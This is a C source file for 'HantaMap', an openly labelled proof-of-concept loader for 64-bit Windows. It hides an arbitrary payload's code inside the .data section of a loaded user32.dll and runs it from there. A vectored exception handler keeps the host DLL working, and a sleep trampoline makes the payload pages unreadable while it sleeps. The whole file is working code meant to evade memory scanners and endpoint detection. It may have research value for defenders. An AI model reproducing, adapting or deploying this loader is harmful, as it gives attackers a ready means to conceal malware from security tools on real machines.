/*
 * mapper.c - HantaMap: Parasitic Data-Section Mapping PoC
 *
 * Maps a PIC payload into the .data section of a legitimately loaded DLL.
 * The payload executes from an address range belonging to the host module,
 * invisible to tools that flag suspicious VirtualAlloc regions.
 *
 * Hijacked pages are PAGE_EXECUTE. On x64 this is equivalent to
 * PAGE_EXECUTE_READ at the PTE level (hardware can't separate execute
 * from read). True execute-only would require custom EPT manipulation.
 *
 * A VEH proxies write faults to a backup buffer so the host DLL stays
 * functional. Only the payload's footprint is overwritten; the rest of
 * .data stays intact.
 *
 * 64-bit Windows only.
 */

#include <windows.h>
#include <stdio.h>
#include <string.h>

#define EFLAGS_TF 0x100
#define PAGE_SZ   4096

/* ---------- hijack state ---------- */

static BYTE  *g_hijack_base  = NULL;
static SIZE_T g_hijack_size  = 0;
static BYTE  *g_backup       = NULL; /* interior pointer into full_backup */
static BYTE  *g_payload_blob = NULL;
static SIZE_T g_payload_size = 0;
static DWORD  g_tls_index    = TLS_OUT_OF_INDEXES;

static volatile LONG g_veh_count = 0;
static volatile LONG g_cloak_count = 0;

/* ---------- guarded sleep trampoline ---------- */

/*
 * Called by the payload instead of Sleep. Runs from the mapper's .text.
 * Flips payload pages to PAGE_NOACCESS while sleeping,
 * sleeps, then flips back to PAGE_EXECUTE. The payload is unreadable
 * for the entire sleep duration.
 */
static void __attribute__((ms_abi)) guarded_sleep(DWORD ms)
{
    DWORD old;
    VirtualProtect(g_hijack_base, g_hijack_size, PAGE_NOACCESS, &old);
    InterlockedIncrement(&g_cloak_count);
    Sleep(ms);
    VirtualProtect(g_hijack_base, g_hijack_size, PAGE_EXECUTE, &old);
}

/* ---------- VEH ---------- */

static inline SIZE_T page_span(SIZE_T off, SIZE_T total)
{
    return (off + PAGE_SZ > total) ? total - off : PAGE_SZ;
}

static LONG CALLBACK veh_handler(EXCEPTION_POINTERS *ep)
{
    DWORD code = ep->ExceptionRecord->ExceptionCode;

    if (code == EXCEPTION_ACCESS_VIOLATION) {
        BYTE *fault = (BYTE *)(ULONG_PTR)ep->ExceptionRecord->ExceptionInformation[1];
        ULONG_PTR type = ep->ExceptionRecord->ExceptionInformation[0];

        /* read (0) or write (1) in the hijacked range */
        if (type != 0 && type != 1) return EXCEPTION_CONTINUE_SEARCH;
        if (fault < g_hijack_base || fault >= g_hijack_base + g_hijack_size)
            return EXCEPTION_CONTINUE_SEARCH;

        InterlockedIncrement(&g_veh_count);

        BYTE *page = (BYTE *)((ULONG_PTR)fault & ~(PAGE_SZ - 1ULL));
        SIZE_T off = (SIZE_T)(page - g_hijack_base);
        SIZE_T sz  = page_span(off, g_hijack_size);

        DWORD old;
        VirtualProtect(page, sz, PAGE_READWRITE, &old);
        memcpy(page, g_backup + off, sz);

        TlsSetValue(g_tls_index, page);
        ep->ContextRecord->EFlags |= EFLAGS_TF;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    if (code == EXCEPTION_SINGLE_STEP) {
        BYTE *page = (BYTE *)TlsGetValue(g_tls_index);
        if (!page) return EXCEPTION_CONTINUE_SEARCH;
        if (page < g_hijack_base || page >= g_hijack_base + g_hijack_size) {
            TlsSetValue(g_tls_index, NULL);
            return EXCEPTION_CONTINUE_SEARCH;
        }

        SIZE_T off = (SIZE_T)(page - g_hijack_base);
        SIZE_T sz  = page_span(off, g_hijack_size);

        memcpy(g_backup + off, page, sz);

        if (off < g_payload_size) {
            SIZE_T ps = g_payload_size - off;
            if (ps > sz) ps = sz;
            memcpy(page, g_payload_blob + off, ps);
        }

        DWORD old;
        VirtualProtect(page, sz, PAGE_EXECUTE, &old);
        TlsSetValue(g_tls_index, NULL);
        ep->ContextRecord->EFlags &= ~(ULONG_PTR)EFLAGS_TF;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

/* ---------- PE helpers ---------- */

static IMAGE_SECTION_HEADER *find_section(BYTE *base, const char *name)
{
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++)
        if (strncmp((char *)sec[i].Name, name, 8) == 0) return &sec[i];
    return NULL;
}

static BYTE *load_payload(const char *path, SIZE_T *out_size, DWORD *out_entry_off)
{
    HANDLE hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                            OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) return NULL;

    DWORD fsz = GetFileSize(hf, NULL);
    if (fsz == INVALID_FILE_SIZE || fsz < sizeof(IMAGE_DOS_HEADER)) {
        CloseHandle(hf);
        return NULL;
    }

    BYTE *fbuf = VirtualAlloc(NULL, fsz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!fbuf) { CloseHandle(hf); return NULL; }

    DWORD rd;
    if (!ReadFile(hf, fbuf, fsz, &rd, NULL) || rd != fsz) {
        CloseHandle(hf);
        VirtualFree(fbuf, 0, MEM_RELEASE);
        return NULL;
    }
    CloseHandle(hf);

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)fbuf;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) goto fail;
    if (dos->e_lfanew < 0 || (DWORD)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS) > fsz)
        goto fail;

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(fbuf + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_CNT_CODE) {
            DWORD entry_rva = nt->OptionalHeader.AddressOfEntryPoint;
            if (entry_rva < sec[i].VirtualAddress) goto fail;

            SIZE_T sz = sec[i].SizeOfRawData;
            BYTE *blob = VirtualAlloc(NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!blob) goto fail;

            memcpy(blob, fbuf + sec[i].PointerToRawData, sz);
            *out_size = sz;
            *out_entry_off = entry_rva - sec[i].VirtualAddress;
            VirtualFree(fbuf, 0, MEM_RELEASE);
            return blob;
        }
    }

fail:
    VirtualFree(fbuf, 0, MEM_RELEASE);
    return NULL;
}

/* ---------- main ---------- */

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("=== HantaMap - Parasitic Data-Section Mapping PoC ===\n\n");

    const char *victim = "user32.dll";
    HMODULE hmod = LoadLibraryA(victim);
    if (!hmod) { printf("[!] LoadLibrary: %lu\n", GetLastError()); return 1; }
    printf("[+] %s at %p\n", victim, (void *)hmod);

    IMAGE_SECTION_HEADER *ds = find_section((BYTE *)hmod, ".data");
    if (!ds) { printf("[!] no .data section\n"); return 1; }
    BYTE *data_base = (BYTE *)hmod + ds->VirtualAddress;
    SIZE_T data_vsize = ds->Misc.VirtualSize;
    SIZE_T data_aligned = (data_vsize + 0xFFF) & ~0xFFFULL;
    printf("[+] .data: %p (0x%llx / 0x%llx)\n", (void *)data_base,
           (unsigned long long)data_vsize, (unsigned long long)data_aligned);

    DWORD entry_off;
    SIZE_T payload_size;
    BYTE *payload = load_payload("payload.exe", &payload_size, &entry_off);
    if (!payload) { printf("[!] payload load failed\n"); return 1; }
    printf("[+] payload: %llu bytes, entry+0x%lx\n",
           (unsigned long long)payload_size, (unsigned long)entry_off);
    if (payload_size > data_aligned) { printf("[!] payload too large\n"); return 1; }

    /* backup .data */
    BYTE *full_backup = VirtualAlloc(NULL, data_aligned, MEM_COMMIT | MEM_RESERVE,
                                     PAGE_READWRITE);
    if (!full_backup) { printf("[!] backup alloc failed\n"); return 1; }
    DWORD old_prot;
    VirtualProtect(data_base, data_aligned, PAGE_READWRITE, &old_prot);
    memcpy(full_backup, data_base, data_vsize);
    printf("[+] .data backed up\n");

    /* map payload at the end of .data so host globals at the start stay intact */
    SIZE_T payload_aligned = (payload_size + 0xFFF) & ~0xFFFULL;
    SIZE_T map_offset = data_aligned - payload_aligned;
    BYTE *map_base = data_base + map_offset;

    memcpy(map_base, payload, payload_size);
    g_payload_blob = payload;
    g_payload_size = payload_size;
    g_hijack_base  = map_base;
    g_hijack_size  = payload_aligned;
    g_backup       = full_backup + map_offset;
    printf("[+] payload at %p (+0x%llx into .data)\n",
           (void *)map_base, (unsigned long long)map_offset);

    /* VEH first, then flip protection (avoids unhandled-fault window) */
    g_tls_index = TlsAlloc();
    PVOID veh = AddVectoredExceptionHandler(1, veh_handler);
    VirtualProtect(map_base, payload_aligned, PAGE_EXECUTE, &old_prot);
    printf("[+] VEH + PAGE_EXECUTE set\n");

    /* launch payload */
    BYTE *entry = map_base + entry_off;
    printf("[*] launching payload at %p\n", (void *)entry);
    HANDLE ht = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entry,
                             (LPVOID)guarded_sleep, 0, NULL);
    if (!ht) { printf("[!] CreateThread: %lu\n", GetLastError()); return 1; }

    Sleep(2000);
    DWORD ec;
    GetExitCodeThread(ht, &ec);
    printf("[+] payload: %s\n", ec == STILL_ACTIVE ? "RUNNING" : "DEAD");

    HANDLE evt = OpenEventA(EVENT_ALL_ACCESS, FALSE, "HantaMapAlive");
    if (evt) {
        printf("[+] HantaMapAlive signaled\n");
        CloseHandle(evt);
    } else {
        printf("[!] event not found (%lu)\n", GetLastError());
    }

    /* prove host DLL still works */
    printf("\n[*] host DLL test...\n");
    printf("[+] screen: %dx%d\n",
           GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN));
    POINT pt;
    GetCursorPos(&pt);
    printf("[+] cursor: (%ld, %ld)\n", pt.x, pt.y);
    MessageBeep(MB_OK);
    printf("[+] MessageBeep: ok\n");
    printf("[+] host DLL fully functional\n");

    /* PAGE_EXECUTE on x64: reads pass through (PTE can't block), writes fault.
     * demonstrate both to show what the VEH actually catches. */
    printf("\n[*] probing stomped pages...\n");

    LONG before_read = g_veh_count;
    volatile BYTE probe = 0;
    for (SIZE_T i = 0; i < payload_size && i < payload_aligned; i += 64)
        probe ^= map_base[i];
    (void)probe;
    LONG after_read = g_veh_count;
    printf("[*] read probe:  %ld VEH intercepts (x64 can't block reads on executable pages)\n",
           (long)(after_read - before_read));

    LONG before_write = g_veh_count;
    volatile BYTE *wp = (volatile BYTE *)map_base;
    BYTE original = g_backup[0];
    *wp = original; /* write faults → VEH swaps in backup, write lands, VEH restores payload */
    LONG after_write = g_veh_count;
    printf("[+] write probe: %ld VEH intercepts (PAGE_EXECUTE blocks writes → VEH proxied)\n",
           (long)(after_write - before_write));

    printf("\n=== HantaMap active ===\n");
    printf("  %s .data at %p\n", victim, (void *)map_base);
    printf("  VEH write intercepts: %ld\n", (long)g_veh_count);
    printf("  Cloak cycles (PAGE_NOACCESS during sleep): %ld\n", (long)g_cloak_count);
    printf("\n[*] Enter to exit\n");
    getchar();

    TerminateThread(ht, 0);
    WaitForSingleObject(ht, 1000);
    CloseHandle(ht);
    RemoveVectoredExceptionHandler(veh);
    VirtualProtect(data_base, data_aligned, PAGE_READWRITE, &old_prot);
    memcpy(data_base, full_backup, data_vsize);
    VirtualFree(full_backup, 0, MEM_RELEASE);
    VirtualFree(payload, 0, MEM_RELEASE);
    TlsFree(g_tls_index);
    return 0;
}
